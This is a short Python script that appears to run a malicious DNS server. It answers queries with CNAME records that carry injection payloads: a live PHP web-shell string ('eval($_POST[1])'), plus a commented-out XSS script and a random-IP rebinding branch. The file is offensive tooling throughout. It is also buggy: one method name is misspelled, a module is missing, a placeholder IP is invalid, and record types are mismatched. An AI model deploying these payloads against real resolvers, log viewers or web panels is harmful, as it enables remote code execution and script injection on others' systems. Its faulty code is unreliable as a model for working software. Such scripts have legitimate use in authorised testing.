from threading import Thread
from dnslib import *
import socket
import datetime
import random


class DomainName(str):
    def __getattr__(self, item):
        return DomainName(item + '.' + self)


LISTEN_PORT = 53
LISTEN_IP = "0.0.0.0"


class DNS_Server:

    def __init__(self):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.sock.bind((LISTEN_IP, LISTEN_PORT))
        print(f'[+] Listening on: {LISTEN_IP}:{LISTEN_PORT}')

    def response(self, data, client):
        request = DNSRecord.parse(data)
        reply = DNSRecord(DNSHeader(id=request.header.id, qr=1, aa=1, ra=1), q=request.q)

        qname = request.q.qname  # queried domain name
        print(str(request.q.qname))
        qtype = request.q.qtype  # query type

        # if str(qname).lower() == "version.bind.":
        #     reply.add_answer(RR(rname=qname, rtype=16, rclass=3, ttl=0, rdata=TXT("dig2@qq.com")))


        # if "script" in str(qname):
        #     random_ip = random.choice([A("127.0.0.1"), A("1.1.1.1")])
        #     print(f"[-] return to {client[0]}: {random_ip}")
        #     reply.add_answer(RR(rname=qname, rtype=getattr(QTYPE, 'A'), rclass=1, ttl=0, rdata=random_ip))
        # elif QTYPE[qtype] == 'A':
        #     rogue_domain = CNAME('<script>alert(/vv/)</script>.testdns.0x3ff.com')
        #     reply.add_answer(RR(rname=qname, rtype=getattr(QTYPE, 'CNAME'), rclass=1, ttl=0, rdata=rogue_domain))
        #     print(f"[-] redirect {client[0]} to XSS subdomain...")

        if qname.startwith('aaa.dns.xxx.com'):
            rdata = CNAME('<?=eval($_POST[1])?>.dns.xxx.com')
            reply.add_answer(RR(rname=qname, rtype=5, rclass=1, ttl=300, rdata=rdata))

        else:
            rdata = A('ip')
            reply.add_answer(RR(rname=qname, rtype=5, rclass=1, ttl=300, rdata=rdata))
            
        self.sock.sendto(reply.pack(), client)

    def start(self):
        while True:
            data, client = self.sock.recvfrom(1024)
            now = datetime.datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S')
            print(f"[+] {now} {client[0]}", end=' ')

            new_thread = Thread(target=self.response, args=(data, client))
            new_thread.setDaemon(True)
            new_thread.start()


if __name__ == '__main__':

    new_server = DNS_Server()
    new_server.start()

    while True:
        time.sleep(1)